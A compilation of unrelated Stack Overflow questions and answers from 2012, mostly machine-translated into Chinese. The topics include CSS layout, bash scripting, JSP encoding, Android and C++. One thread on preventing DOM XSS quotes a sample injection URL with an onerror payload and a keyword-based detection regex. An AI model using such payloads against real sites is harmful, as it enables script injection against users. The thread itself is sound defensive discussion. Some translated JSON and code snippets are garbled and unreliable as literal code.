现在，使用 javascript，我想在该背景的每一侧添加一些绝对定位的 DIV 以扩展它：

```
-----------------------------------
|*********|*************|*********|          
|*********|*************|*********|          
|*********|*************|*********|          
|*********|*************|*********|          
|*********|*************|*********|          
|*********|*************|*********|
----------------------------------- 
```

随着窗口大小的调整，居中的背景将移动（保持在窗口的中心），因此每一侧的 div 应该随之移动。

任何人都可以提出解决此问题的方法吗？

关于我为什么这样做的旁注：

背景是大图像，我希望通过翻转它在屏幕上重复它，如下所述：

[使用 Javascript 进行背景翻转平铺](https://stackoverflow.com/questions/13287090/background-flipped-tiling-using-javascript)

在那个问题中讨论了翻转的实际过程，而这个问题涉及定位的 CSS/Javascript 方面。

请注意，在浏览器不支持的情况下，我很乐意将页面保留在第一个图中，只有居中的背景。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:16:57.657

使用 javascript 添加两个 DIV。然后根据您的意愿设置它们相对于屏幕中心的位置。添加一个 onresize 事件，该事件将在浏览器窗口调整大小时重新定位 DIV。

```
window.onresize = updateDivsPosition; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:24:42.550

您可以尝试使用定位的纯 css 解决方案。我假设您在页面中心有一个固定大小的图像。例如，假设您的图像是 800px 宽，那么

*   将左侧 div 定位为左侧 0px，右侧 50%，并添加 400px 的右边距
*   将右侧 div 定位为左侧 50%，右侧 0px，并添加 400px 的左边距

**示例：http:** [//jsfiddle.net/F4kay/](http://jsfiddle.net/F4kay/)

（请注意，我假设较小的 jsfiddle 窗口的图像宽度为 256px）

**CSS：**

```
#left {
    position:absolute;
    left:0px;
    right:50%;
    top:0px;
    bottom:0px;
    margin-right: 128px; /* image width / 2 */
    background-color:#ccc;
}    

#right {
    position:absolute;
    left:50%;
    right:0px;
    top:0px;
    bottom:0px;
    margin-left: 128px; /* Image width / 2 */
    background-color:#ccc;  
} 
```

​<strong>HTML：

```
<div id="left">Left</div>
<div id="right">Right</div>​ 
```

至于这些 div 的高度，这取决于您如何处理，顶部/底部：0px 或固定/百分比高度。在示例中，我使用了顶部 0px 和底部 0px。

诀窍是基本上添加 2 个 div，一个占据屏幕的左半部分，另一个占据屏幕的右半部分。您向内部 div 边缘添加边距以显示内部内容。我假设宽度是固定的，但您也可以使用百分比宽度的一半。如果您的图像随 js 动态变化，则只是更新边距的一种情况。

* * *

为了完整起见，我已经包含了一个使用这种技术的完整示例。我认为这是一个干净的解决方案。

**示例：http:** [//jsfiddle.net/Hqpyx/](http://jsfiddle.net/Hqpyx/)

**CSS：**

```
body, .bgImage {
    background-image: url('http://flickholdr.com/640/1280/5');
}

.flip {
    -moz-transform:    scaleX(-1);
    -o-transform:      scaleX(-1);
    -webkit-transform: scaleX(-1);
    transform:         scaleX(-1);
    filter:            FlipH;
    -ms-filter:        "FlipH";
}

body {
 background-position: top center;     
}

#left {
    position:absolute;
    left:0px;
    right:50%;
    top:0px;
    bottom:0px;
    margin-right: 320px; /* image width / 2 */
    background-position:top left;    
}

#right {
    position:absolute;
    left:49.99%;
    right:0px;
    top:0px;
    bottom:0px;
    margin-left: 320px; /* Image width / 2 */
    background-position:top right;
} 
```

**HTML：** ​</p>

```
<div id="left" class="bgImage flip"></div>
<div id="right" class="bgImage flip"></div>​ 
```

我个人会避免像这样翻转图像。除非您有一些限制，否则您可以只编辑背景图像并将翻转版本的一半和一半拼接在一起，例如

```
[ ] = full image

{ } = flipped image

create an image that looks like

}[ ]{ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T12:12:52.983

这是我的静态 CSS 解决方案。这与[马特的回答](https://stackoverflow.com/a/13288134/206614)类似，但我无法让他使用翻转的图像和灵活的宽度。

[演示在这里。](http://jsfiddle.net/jfrej/LuxRb/1/)

到目前为止，它只在每一侧添加了一个 div。如果您需要更多，我可以为此编写一些 JS。页面的 HTML 标记为：

```
<div class="content">
    <div class="left-background"></div>
    <div class="right-background"></div>
    content
</div> 
```

和 CSS：

```
body {
    color: #dddddd;
    overflow-x: hidden;
}
@media (max-width: 400px) {
    body {
        overflow-x: visible;
    }
    .left-background, .right-background {
        display: none;
    }
}
.content, .left-background, .right-background {
    background-image: url(http://flickholdr.com/400/300/sea,sun/bw);
    height: 200px;
    width: 400px;
}
.left-background, .right-background {
    -moz-transform:    scaleX(-1);
    -o-transform:      scaleX(-1);
    -webkit-transform: scaleX(-1);
    transform:         scaleX(-1);
    filter:            FlipH;
    -ms-filter:        "FlipH";

    position: absolute;
}
.left-background {
    left: -400px;
}
.right-background {
    right: -400px;
}
.content {
    margin: 0 auto;
    position: relative;
} 
```

# linux - 一次全部标准输出，而不是逐行

> ID：13287664
> 
> 赞同：1
> 
> 时间：2012-11-08T10:56:34.113
> 
> 标签：linux, bash

我编写了一个脚本，通过 ssh'ing 到每个服务器来获取服务器列表的负载和内存信息。但是，由于大约有 20 台服务器，等待脚本结束的效率不是很高。这就是为什么我认为创建一个将脚本的输出写入文件的 crontab 可能很有趣，所以只要我需要知道 20 个服务器的负载和内存信息时，我需要做的就是 cat 这个文件。但是，当我在执行 crontab 期间 cat 这个文件时，它会给我不完整的信息。那是因为我的脚本的输出是逐行写入文件的，而不是在终止时一次全部写入。我想知道需要做什么才能使这项工作...

我的 crontab：

```
* * * * * (date;~/bin/RUP_ssh) &> ~/bin/RUP.out 
```

我的 bash 脚本（RUP_ssh）：

```
for comp in `cat ~/bin/servers`; do
    ssh $comp ~/bin/ca
done 
```

谢谢，

尼夫帕舍嫩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:04:13.387

您可以将输出缓冲到一个临时文件，然后像这样一次性输出：

```
outputbuffer=`mktemp` # Create a new temporary file, usually in /tmp/
trap "rm '$outputbuffer'" EXIT # Remove the temporary file if we exit early.
for comp in `cat ~/bin/servers`; do
    ssh $comp ~/bin/ca >> "$outputbuffer" # gather info to buffer file
done
cat "$outputbuffer" # print buffer to stdout
# rm "$outputbuffer" # delete temporary file, not necessary when using trap 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-01T14:03:53.753

假设有一个字符串来标识内存/加载数据来自哪个主机，您可以在每个结果进来时更新您的 txt 文件。假设数据块是一行长，您可以使用

```
for comp in `cat ~/bin/servers`; do
    output=$( ssh $comp ~/bin/ca )
    # remove old mem/load data for $comp from RUP.out
    sed -i '/'"$comp"'/d' RUP.out # this assumes that the string "$comp" is
                                  # integrated into the output from ca, and
                                  # not elsewhere
    echo "$output" >> RUP.out
done 
```

这可以根据 ca 的输出进行调整。网络上有很多关于 sed 的帮助。

# json - 服务器请求返回不同的对象

> ID：13287665
> 
> 赞同：0
> 
> 时间：2012-11-08T10:56:39.813
> 
> 标签：json, http, server-side, httpresponse

我正在使用现有的 web api。我将 JSONObjectA 列表上传到服务器，然后返回 JSONObjectB 列表。这一切都很好，我很高兴。当我将列表 1 发送到服务器时出现问题。我只收到 JSONObjectB，而不是返回一个列表。这意味着我需要不同的序列化器来解析数据。

服务器始终返回一个列表（即始终返回相同的对象）是否更有意义，或者以当前方式执行此操作是否被认为是一种好习惯？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:00:42.653

总是返回一个列表会更有意义。在构建 API 时，您应该始终考虑易用性，并且返回 2 种不同的类型意味着 API 用户必须做他们不应该做的额外工作。

# javascript - Preventing DOM XSS

> ID：13287677
> 
> 赞同：8
> 
> 时间：2012-11-08T10:57:32.020
> 
> 标签：javascript, xss

We recently on-boarded someone else's code which has since been tested, and failed, for DOM XSS attacks. Basically the url fragments are being passed directly into jQuery selectors and enabling JavaScript to be injected, like so:

```
"http://website.com/#%3Cimg%20src=x%20onerror=alert%28/XSSed/%29%3E)"
$(".selector [thing="+window.location.hash.substr(1)+"]"); 
```

The problem is that this is occurring throughout their scripts and would need a lot of regression testing to fix e.g. if we escape the data if statements won't return true any more as the data won't match.

The JavaScript file in question is concatenated at build time from many smaller files so this becomes even more difficult to fix.

Is there a way to prevent these DOM XSS attacks with some global code without having to go through and debug each instance.

* * *

I proposed that we add a little regular expression at the top of the script to detect common chars used in XSS attacks and to simply kill the script if it returns true.

```
 var xss = window.location.href.match(/(javascript|src|onerror|%|<|>)/g);

if(xss != null) return; 
```

This appears to work but I'm not 100% happy with the solution. Does anyone have a better solution or any useful insight they can offer?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T14:53:31.947

If you stick to the regular expression solution, which is far from ideal but may be the best choice given your constraints:

Rather than defining a regular expression matching malicious hashes (`/(javascript|src|onerror|%|<|>)/g`), I would define a regular expression matching sound hashes (e.g. `/^[\w_-]*$/`).

It will avoid false-positive errors (e.g. `src_records`), make it clear what is authorized and what isn't, and block more complex injection mechanisms.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T14:35:26.820

Your issue is caused by that jQuery's input string may be treated as HTML, not only as selector.

Use native [`document.querySelector()`](https://developer.mozilla.org/en-US/docs/DOM/Document.querySelector) instead of jQuery.

If support for IE7- is important for you, you can try [Sizzle](http://sizzlejs.com/) selector engine which likely, unlike jQuery and similar to native `querySelector()`, does not interpret input string as something different from a selector.

# jquery - 如何将 history.js 集成到我的 ajax 网站？

> ID：13287685
> 
> 赞同：0
> 
> 时间：2012-11-08T10:58:13.517
> 
> 标签：jquery, ajax, codeigniter, history.js

我的网站中有左右 div 和导航按钮。假设button_1，button_2。

单击这些按钮时，将使用 ajax 更改右侧 div 内容，因此意味着左侧 div 什么也不做。

以上是我所做的，但我这里有一个问题，网址没有改变。而且我发现history.js 能够解决这个问题，但我找不到任何关于history.js + ajax 的教程。

谁能帮我吗？

感谢广告

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:04:01.210

尝试在此处阅读：[此要点将使用 History.js 和 ScrollTo 使用 HTML5 History API 对您的网站进行 ajaxify。](https://gist.github.com/854622)

# math - 数字对齐算法

> ID：13287686
> 
> 赞同：0
> 
> 时间：2012-11-08T10:58:14.830
> 
> 标签：math

是否有一种算法可以采用两列数字并确定它们是否具有共同值？

两列：

每个值增加 0.3。另一个不规律地增加。我想确定这两列是否具有共同的值。

```
.3  .1
.6  .2
.9  .4
1.2  .5
1.5  .9
1.8  .13 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:00:46.837

如果两个系列都在*增加*（或通常排序为¹），则有一个`O(n)`解决方案。没有比这更好的了，因为在最坏的情况下，您需要*至少查看一次不规则增加的列表中的每个元素。*

只需以类似拉链的方式同时遍历两者：始终从列表中获取下一个元素，该元素当前具有比另一个更小的元素。

```
> .3   .1 < | > .3   .1   | > .3   .1   |   .3   .1   |   .3   .1   |   .3   .1   
  .6   .2   |   .6   .2 < |   .6   .2   | > .6   .2   | > .6   .2   | > .6   .2   
  .9   .4   |   .9   .4   |   .9   .4 < |   .9   .4 < |   .9   .4   |   .9   .4   
  .12  .5   |   .12  .5   |   .12  .5   |   .12  .5   |   .12  .5 < |   .12  .5   
  .15  .9   |   .15  .9   |   .15  .9   |   .15  .9   |   .15  .9   |   .15  .9 < 
  .18  .13  |   .18  .13  |   .18  .13  |   .18  .13  |   .18  .13  |   .18  .13 
```

* * *

¹其中 sorted 表示相对于[总订单](http://en.wikipedia.org/wiki/Total_order)。

# string - 如何正确解释来自 JSP 页面的 Umlaute 参数

> ID：13287688
> 
> 赞同：2
> 
> 时间：2012-11-08T10:58:22.213
> 
> 标签：string, jsp, utf-8, character-encoding, diacritics

我正在从 JSP 页面上的文本输入字段中获取输入，该字段可能包含变音符号。（例如 Ä,Ö,Ü,ä,ö,ü,ß）。

处理输入适用于非元音变音。但是，每当在输入字段中输入元音变音时，就会传递一个不正确的值。

例如：

*   如果在输入字段中输入了**“ä”（UTF-8:U+00E4） ，**
*   从参数中提取的字符串是**“Ã¤”（UTF-8：U+00C3 和 U+00A4）**

在我看来，UTF-8 十六进制编码（对于“ä”是 c3 a4）被用于转换。

**如何检索正确的值？**

* * *

以下是当前实现的片段：

JSP 页面将输入值“pk”传递给处理逻辑：

```
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
...
<input type="text" name="<%=pk.toString()%>" value="<%=value%>" size="70"/>
<button type="submit" title="Edit" value='Save' onclick="action.value='doSave';pk.value='<%=pk.toString()%>'"><img src="icons/run.png"/>Save</button> 
```

该值从 args 中检索并转换为字符串：

```
UUID pk = UUID.fromString(args.get("pk")); //$NON-NLS-1$
String value = args.get(pk.toString()); 
```

*注意：保存在数据库中的变音符号会正确显示在页面上。*

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T11:17:48.207

> *注意：保存在数据库中的变音符号会正确显示在页面上。*

由于这个事实，我假设您已经通过`<%@page pageEncoding="UTF-8"%>`in JSP 或`<jsp-config>`in正确地将响应编码设置为 UTF-8 `web.xml`。

留下请求编码。如果您使用 GET 或 POST，您的问题和代码都不清楚。如果您使用 POST，那么您需要创建一个显式设置 HTTP 请求正文编码的[servlet 过滤器：](https://stackoverflow.com/tags/servlet-filters/info)

```
request.setCharacterEncoding("UTF-8"); 
```

或者，如果您使用 GET，那么您需要深入了解服务器配置以将 URI/参数编码设置为 UTF-8。如何做到这一点取决于所使用的服务器，从问题中也不清楚，更不用说从您的问题历史记录中了。因此，我将仅举一个 Tomcat 的示例：在 Tomcat 中设置元素的`URIEncoding`属性：`<Connector>``/conf/server.xml`

```
<Connector ... URIEncoding="UTF-8"> 
```

### 也可以看看：

*   [Unicode - 如何让字符正确？](http://balusc.blogspot.com/2009/05/unicode-how-to-get-characters-right.html)

# android - 使用 ListActivity 隐藏应用程序标题的异常

> ID：13287690
> 
> 赞同：1
> 
> 时间：2012-11-08T10:58:34.333
> 
> 标签：android, android-actionbar, titlebar

我有一个扩展类`ListActivity`，我正在尝试使用下面的代码隐藏默认的 TitleBar（我认为它称为 ActionBar）。它适用于常规活动，但不适用于`ListActivity`. 在这种情况下我如何完成相同的任务？

```
public class MyClass extends ListActivity{
    @Override
    public void onCreate(Bundle b) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(b);
        // Tried Window.FEATURE_NO_TITLE here as well
        setContentView(R.layout.activity_myclass);
        getActionBar().setDisplayHomeAsUpEnabled(true);
    }
} 
```

结果是 NullPointerException。如果您需要，完整的错误堆栈跟踪在这里：http: [//pastebin.com/VLR5dE8m](http://pastebin.com/VLR5dE8m)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:42:45.917

要禁用 Titltbar，请在清单文件中使用此代码，它将对您有所帮助。

<activity android:theme="@android:style/Theme.NoTitleBar.Fullscreen" >

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:10:06.610

如果您使用 ActionBar，我认为您不应该使用 requestWindowFeature()。您可以使用以下命令隐藏 ActionBar 的标题：

```
ActionBar actionBar = getActionBar(); 
actionBar.setDisplayShowTitleEnabled(false); 
```

[http://developer.android.com/reference/android/app/ActionBar.html#setDisplayShowTitleEnabled(boolean](http://developer.android.com/reference/android/app/ActionBar.html#setDisplayShowTitleEnabled(boolean) )

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:15:08.037

要删除操作栏：getActionBar().hide()。另请参阅此答案：[如何永久禁用操作栏](https://stackoverflow.com/questions/8456835/how-to-disable-action-bar-permanently)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-08T11:14:51.450

似乎 NullPointerException 是由`getActionBar()`. 从代码中删除以下行解决了该问题。

```
getActionBar().setDisplayHomeAsUpEnabled(true); 
```

**最终（工作）代码：**

```
public class MyClass extends ListActivity{
    @Override
    public void onCreate(Bundle b) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(b);
        setContentView(R.layout.activity_myclass);
     }
} 
```

注意`requestWindowFeature`必须在调用`super`类之前调用​​，并且`setContentView`.

# c# - 插入后立即获取行不返回结果

> ID：13287694
> 
> 赞同：1
> 
> 时间：2012-11-08T10:58:56.517
> 
> 标签：c#, .net, sql-server, sql-server-2008, ado.net

我正在运行单元测试，当我尝试在数据库中插入数据并在之后立即获取它时，我什么也没得到（我尝试过使用`DataAdapter`and `DataReader`）。

但是，当我在插入和选择之间放置 3 秒睡眠（即使 1 秒也不起作用......）时，我得到了结果。

在 SQL Server Profiler 中，我可以看到执行情况，插入完成得很好，并且在选择开始前大约 10 毫秒完成。

我不知道这是哪里来的

代码如下所示：插入方法

```
SqlCommand command = new SqlCommand(sqlTemplate);
command.Parameters.Add(Sql4oConstants.Sql4oIdParameterName, SqlDbType.UniqueIdentifier).Value = id;
command.Parameters.Add(Sql4oConstants.Sql4oTimestampParamterName, SqlDbType.DateTime).Value = DateTime.Now;

command.CommandTimeout = dataSourceDescription.CommandTimeout;
DatabaseManager.ExecuteNonQuery(dataSourceDescription.ConnectionString, command); 
```

获取方法

```
public static void Fill(string connectionString, DataTable table, SqlCommand command)
    {
        try
        {
            LogStorageWriter.WriteLogEntry(log, EStorageLevelLog.Debug, string.Format("Execute query: {0}", command.CommandText));

            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                command.Connection = conn;
                using (SqlDataAdapter adapter = new SqlDataAdapter(command))
                {
                    adapter.Fill(table);
                }
            }
        }
        catch (InvalidOperationException e)
        {
            LogStorageWriter.WriteLogEntry(log, EStorageLevelLog.Error, string.Format("Exception : {0}", e.ToString()));
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-11T07:43:12.900

我解决了。

事实上，这是因为我的请求使用了一个 CONTAINS。然后我发现使用 CONTAINS 调用 SQL Server 索引器来获取数据。但引擎不会立即索引数据。这就是为什么我必须等待 2 或 3 秒才能取回我的数据。

# performance - 如何计算以下表达式中的算术运算次数？

> ID：13287695
> 
> 赞同：0
> 
> 时间：2012-11-08T10:59:05.190
> 
> 标签：performance

exp(-(intA-FloatB)^2/(2*(FloatC^2))) 请注意，指数并不复杂！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T16:14:10.187

删除所有空格。

对于简单的算术运算符，计算`+`、`-`、`*`、`/`和`^`字符的数量。但是，如果其中一个字符后跟`+`or`-`和一个数字，您应该将其视为一个操作——第二个只是文字数字的符号。此外，如果表达式以数字开头`+`或`-`后跟数字，出于同样的原因不要计算它。

对于函数调用，count`(`前面有一个字母或数字。

将这些加在一起，就得到了操作的总数。

# c++ - C++ 使用类内标头中的类

> ID：13287696
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:59:06.180
> 
> 标签：c++, class, header

我在头文件中的类中使用的类有点麻烦。

我有课时间.h：

```
#ifndef TIME_H
#define TIME_H
#include <iostream>
using namespace std;

class Time  
{
private:
    int hour, minute, second;
public:
    Time();
    ~Time();

    Time(int h, int m, int s);

    int getHour();
    int getMinute();
    int getSecond();

    void setHour(int hour);
    void setMinute(int minute);
    void setSecond(int second);

    Time getTimeFromUser(Time b);
    bool validTime(Time a);
    void print24Hour(Time a);
    void print12Hour(Time b);
};

#endif 
```

时间表.h

```
#ifndef SCHEDULE_H
#define SCHEDULE_H
#include <iostream>
#include "time.h"
using namespace std;

class Class 
{
    private:
        string name;
        int credits;
        bool majorRequirement;
        double avgGrade;
        string days;

        Time startTime;
        Time endTime;

    public:
        Class();
        ~Class();

        Class(string namae, int cred, bool majorReq, double avg, string day);

        //Mutate
        void setName(string h);
        void setCredits(int c);
        void setMajorRequirement(bool set);
        void setAvgGrade(double g);
        void setDays(string d);

        void getStartTimeFromUser(Time b);
        void getEndTimeFromUser(Time e);

        // Access
        string getName();
        int getCredits();
        bool getMajorRequirement();
        double getAvgGrade();
        string getDays();

        Time& getStartTime();
        Time& getEndTime();
};

#endif 
```

时间表.cpp：

```
Class::Class() 
{
    string name = "";
    int credits = 0;
    bool majorRequirement = false;
    double avgGrade = 0.0;
    string days = "";
}

Time::Time()
{
    int hour = 0;
    int minute = 0;
    int second = 0;
}

Class::Class(string namae, int cred, bool majorReq, double avg, string day) 
{
    name = namae;
    credits = cred;
    majorRequirement = majorReq;
    avgGrade = avg;
    days = day;
}

Time::Time(int h, int m, int s)
{
    second = s;
    minute = m;
    hour = h;
}

Time getTimeFromUser(Time b)
{
    string time = "";

    string hourS, minuteS, secondS = new string();

    getline(cin,time);

    hourS = time.substr(0,2);
    minuteS = time.substr(3,2);
    secondS = time.substr(6,2);

    b.hour = atoi(hourS.c_str());
    b.minute = atoi(minuteS.c_str());
    b.second = atoi(secondS.c_str());

    return b;
}

void getStartTimeFromUser(Time b)
{
    startTime = getTimeFromUser(b);
}

void getEndTimeFromUser(Time e)
{
    endTime = getTimeFromUser(e);
}

Other Mutators and Accessors here. 
```

主线很长。这是严重压缩的版本：

```
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <iomanip>
#include "time.h"
#include "schedule.h"
using namespace std;

int main()
{
    // Expecting that variables are properly declared

    Class * klass = new Class[classcount];

    cout << "Enter the start time for the class (format is HH:MM:SS): ";
    klass[i].getStartTimeFromUser(classB);

    cout << "Enter the end time for the class (format is HH:MM:SS): ";
    klass[i].getEndTimeFromUser(classE);

for(int i = 0; i < classcount; i++)
    {
    // Data collected via getline and changed through mutators/accessors
    // Problems arise when working with Time

    klass[i].getStartTime().print24hour();
    }
} 
```

我得到了很多“小时，秒，分钟等”。是私人错误，我猜我正在以一种相当错误的方式做一些简单的事情。请帮忙。

我得到了很多这样的：

```
time.h:10:7: error: ‘int Time::hour’ is private
schedule.cpp:146:4: error: within this context
time.h:10:13: error: ‘int Time::minute’ is private
schedule.cpp:147:4: error: within this context
time.h:10:21: error: ‘int Time::second’ is private
schedule.cpp:148:4: error: within this context
schedule.cpp: In function ‘void getStartTimeFromUser(Time)’:
schedule.cpp:155:16: error: ‘setStartTime’ was not declared in this scope
schedule.cpp: In function ‘void getEndTimeFromUser(Time)’:
schedule.cpp:160:2: error: ‘endTime’ was not declared in this scope
time.h: In function ‘bool validTime(Time)’: 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:12:49.510

您的代码中有几个错误：

*   我假设`class`在你的`main()`函数中代表一个数组 `Class`；但这是非法的，因为`class`它是 C++ 关键字。

*   您正在尝试访问`Class`对象 ( `class[i].startTime`) 的私有成员。这又是违法的。您需要该数据成员的公共访问器：

*   您正在调用一个不存在的函数 ( `print24()`)。如果您打算调用`print24hour()`，则此函数不带任何参数。

综上所述，您需要做三件事：

1.  `startTime`为in添加访问器`Class`：

    ```
    class Class
    {
      //...
    public:
      Time GetStartTime() {return startTime;}
    }; 
    ```

2.  为您的数组使用合法名称并使用`std::vector`or `std::array`：

    ```
    std::vector<Class> classArray;
    // OR:
    std::array<Class, SIZE> classArray; 
    ```

3.  正确调用正确的方法：

    ```
    classArray[i].GetStartTime().print24hour(); 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:04:14.637

我你想`class[i].startTime.print24(getStartTime())`从`main`你那里访问需要`startTime`公开。

如果这是好的风格是一个不同的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:14:01.623

```
class Class
{
    private:
      Time startTime;

    public:
      const Time & getStartTime(){
        return startTime;
      }    
};

int main()
{
    Class c;
    c.getStartTime().print24Hour(); 
} 
```

你要么想要那个，要么`startTime`公开。

注意`const`; 如果您不希望返回的引用为`const`，请立即`startTime`公开。您可能认为制作它`private`可以提高封装性；是的，它确实如此，只要您不提供对变量的读写访问权限，如果您不标记成员函数 return type ，就会发生这种情况`const`。

如果您的打印功能未标记`const`，那么您的 const 正确性不存在。如果在这里使用 const 引用作为返回类型，那么您需要解决一些问题。

相关阅读：[伪类和准类](http://www.idinews.com/quasiClass.pdf)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T11:08:07.047

您正在尝试直接使用该对象访问类的私有成员。

[请在此处](http://www.learncpp.com/cpp-tutorial/83-public-vs-private-access-specifiers/)阅读有关公共和私有访问说明符的信息。

# rest - Json 格式的 Drupal 休息服务

> ID：13287697
> 
> 赞同：-3
> 
> 时间：2012-11-08T10:59:10.993
> 
> 标签：rest, drupal, android-service

我正在研究 drupal 7。我在 drupal 视图中创建了一个休息服务。我想在我的 android 应用程序中使用此服务。当我尝试查看我的服务时

[http://mysite.com/ubercart/?q=rest/views/doctor](http://mysite.com/ubercart/?q=rest/views/doctor)

我得到这样的回应

> [{,"foaf:Document"],"title":{"predicates":["dc:title"]},"created":{"predicates":["dc:date","dc:created"] ,"datatype":"xsd:dateTime","callback":"date_iso8601"},"changed":{"predicates":["dc:modified"],"datatype":"xsd:dateTime","callback" :"date_iso8601"},"body":{"predicates":[""vid":"12","uid":"1","title":"raja","log":"","status ":"1","comment":"2","promote":"0","sticky":"0","nid":"12","type":"doctor","language": “和”，created":"1351849158","changed":"1351849158","tnid":"0","translate":"0","re​​vision_timestamp":"1351849158","re​​vision_uid":"1","field_rating" :{"und":[{"value":"4"}]},"field_place":{"und":[{"value":"Guntur","format":null,"safe_value":"Guntur "}]},"rdf_mapping":{"rdftype":["sioc:Item","foaf:Document"],"title":{"predicates":["dc:title"]},"created": {"predicates":["dc:date","dc:created"],"datatype":"xsd:dateTime","callback":"date_iso8601"},"changed":{"predicates":["dc:modified"],"datatype":"xsd:dateTime","callback":"date_iso8601"},"body":{"predicates":["content:encoded"]},"uid":{ "predicates":["sioc:has_creator"],"type":"rel"},"name":{"predicates":["foaf:name"]},"comment_count":{"predicates":[" sioc:num_replies"],"datatype":"xsd:integer"},"last_activity":{"predicates":["sioc:last_activity_date"],"datatype":"xsd:dateTime","callback":"date_iso8601 "}},"cid":"0","last_comment_timestamp":"1351849158","last_comment_name":null,"last_comment_uid":"1","comment_count":"0","name":"admin","picture":"0","data":"b:0;","uc_order_product_id":false,"ucnc_product_nid":false},{"vid ":"11","uid":"1","title":"ravi","log":"","status":"1","comment":"2","promote":" 0","sticky":"0","nid":"11","type":"doctor","language":"und","created":"1351849131","changed":"1351849131" ,"tnid":"0","translate":"0","re​​vision_timestamp":"1351849131","re​​vision_uid":"1","field_rating":{"und":[{"value":"5"}]},"field_place":{"und":[{"value":"Hyderabad","format":null,"safe_value":"Hyderabad"}] },"rdf_mapping":{"rdftype":["sioc:Item","foaf:Document"],"title":{"predicates":["dc:title"]},"created":{"predicates ":["dc:date","dc:created"],"datatype":"xsd:dateTime","callback":"date_iso8601"},"changed":{"predicates":["dc:modified" ],"datatype":"xsd:dateTime","callback":"date_iso8601"},"body":{"predicates":["content:encoded"]},"uid":{"predicates":[" sioc:has_creator"],"type":"rel"},"name":{"predicates":["foaf:name"]},"comment_count":{"predicates":["sioc:num_replies"],"datatype":"xsd: integer"},"last_activity":{"predicates":["sioc:last_activity_date"],"datatype":"xsd:dateTime","callback":"date_iso8601"}},"cid":"0"," last_comment_timestamp":"1351849131","last_comment_name":null,"last_comment_uid":"1","comment_count":"0","name":"admin","picture":"0","data":" b:0;","uc_order_product_id":false,"ucnc_product_nid":false},{"vid":"10","uid":"1","标题":"sree","log":"","status":"1","comment":"2","promote":"0","sticky":"0","nid": "10","type":"doctor","language":"und","created":"1351849109","changed":"1351849109","tnid":"0","translate":"0 ","re​​vision_timestamp":"1351849109","re​​vision_uid":"1","field_rating":{"und":[{"value":"4"}]},"field_place":{"und":[ {"value":"Hyderabad","format":null,"safe_value":"Hyderabad"}]},"rdf_mapping":{"rdftype":["sioc:Item"content:编码"]},"uid":{"predicates":["sioc:has_creator"],"type":"rel"},"name":{"predicates":["foaf:name"]}," comment_count":{"predicates":["sioc:num_replies"],"datatype":"xsd:integer"},"last_activity":{"predicates":["sioc:last_activity_date"],"datatype":"xsd :dateTime","callback":"date_iso8601"}},"cid":"0","last_comment_timestamp":"1351849109","last_comment_name":null,"last_comment_uid":"1","comment_count":"0 ","名称":"管理员","图片":"0","数据":"b:0;","uc_order_product_id":false,"ucnc_product_nid":false}]

其实我需要这样的回应

> {"nodes":{"0":{"node":{"title":"raja","field_place":"Guntur","rating":"4"}},"1":{"node" :{"title":"ravi","field_place":"Hyderabad","rating":"5"}},"2":{"node":{"title":"sree","field_place": "海得拉巴","评级":"4"}}}}

谁能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T12:16:22.630

我在上面找到了解决方案。有些网站把我带错了方向。网址是

[http://mysite.com/ubercart/?q=rest/doctor](http://mysite.com/ubercart/?q=rest/doctor)

我得到了我需要的格式。我还发现 servces 3x 版本对 json 格式的 weservices 有一些问题。它在 xml 格式化程序中对我很有用。

# android - ActionBasSherlock、Holoeverywhere 和主题

> ID：13287700
> 
> 赞同：0
> 
> 时间：2012-11-08T10:59:23.207
> 
> 标签：android, themes, android-holo-everywhere

我正在尝试实现两个主题的选择，即黑暗和光明。

深色的工作正常，但是当我选择浅色主题时，它的渲染不正确（操作栏是浅色的，文本是深色的，但背景仍然是深色的）。

顺便说一下，在 Eclipse 预览中它显示正确。

我正在使用 Holoeverwhere 的 dev 分支，并且我正在扩展这样的主题：

样式.xml

```
<?xml version="1.0" encoding="utf-8"?>
<resources xmlns:android="http://schemas.android.com/apk/res/android">
    <style name="DarkTheme" parent="Holo.Theme"/>
    <style name="LightTheme" parent="Holo.Theme.Light"/>
</resources> 
```

有什么帮助吗？

**编辑**

我刚刚尝试使用模拟器（3.2，在平板电脑上）并且它正确显示了主题。我会做一些测试，最终在 github 上打开一个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:33:51.300

我终于找到了解决方案：[Theme_HoloEverywhereLight_Sherlock 显示深色背景](https://stackoverflow.com/questions/11172965/theme-holoeverywherelight-sherlock-showing-dark-background)

（我已经找了几个小时，现在才出现。）

基本上 setTheme 应该在一切之前完成，甚至在 之前`super.onCreate(savedInstanceState);`，我只是在之后..

# ruby - nbsp 的 Ruby 正则表达式处理

